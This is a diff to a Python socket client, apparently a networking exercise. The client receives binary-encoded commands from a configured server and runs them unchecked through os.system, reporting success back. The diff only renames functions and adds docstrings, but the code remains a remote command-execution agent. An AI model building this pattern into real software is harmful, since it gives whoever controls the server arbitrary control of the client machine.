@@ -1,7 +1,6 @@
 import configparser
 import os
 import socket
-import subprocess
 
 ClientMultiSocket = socket.socket()
 
@@ -14,34 +13,44 @@ directory = socket_info["directory"]
 
 try:
     ClientMultiSocket.connect((host, port))
-    print('new client started!')
+    print('new client connected')
 except socket.error as e:
     print(str(e))
 res = ClientMultiSocket.recv(1024)
 
 
-def convert_to_binary(binary_string):
+def convert_from_binary(binary_string):
+    """
+    converts binary to string, returns result
+    """
     chunks = [binary_string[i:i + 8] for i in range(0, len(binary_string), 8)]
     return "".join([chr(int(binary, 2)) for binary in chunks])
 
 
-def save_payload_in_dir(massage_num, payload):
+def save_payload_in_dir(message_num, payload):
+    """
+    saves a given payload in clients directory as given at clients conf. file
+    """
     if not os.path.isdir(directory):
         os.makedirs(directory)
-    file_name = directory + "\maessage_" + str(massage_num) + "_payload"
+    file_name = directory + "\maessage_" + str(message_num) + "_payload"
     text_file = open(file_name, "w+")
     text_file.write(payload)
     text_file.close()
 
+
 def handle_shell_command(command_parts):
-    # for example: "01100101011000110110100001101111" is "echo"
+    """
+    gest command arguments in seperated form and runs matching function with
+    given arguments
+    """
     save_payload_in_dir(command_parts[0], command_parts[4])
-    ascii_string = convert_to_binary(command_parts[4])
+    # for example: "01100101011000110110100001101111" is "echo"
+    ascii_string = convert_from_binary(command_parts[4])
     shell_command = ascii_string
     for i in range(5, len(command_parts)):
         shell_command += " " + command_parts[i]
-    os.system(shell_command)
-    # os.system('echo hello')
+    os.system(shell_command)  # os.system('echo hello')
     ClientMultiSocket.send(str.encode("Successfully executed. Command identifier: " + command_parts[0]))
 
 
@@ -52,7 +61,7 @@ while True:
         ClientMultiSocket.close()
         break
     else:
-        #command is type message command
+        # case command is "send"
         command_parts = command.split()
         ClientMultiSocket.send(str.encode("Recived message. Command identifier: " + command_parts[0]))
         if command_parts[3] == "shell":
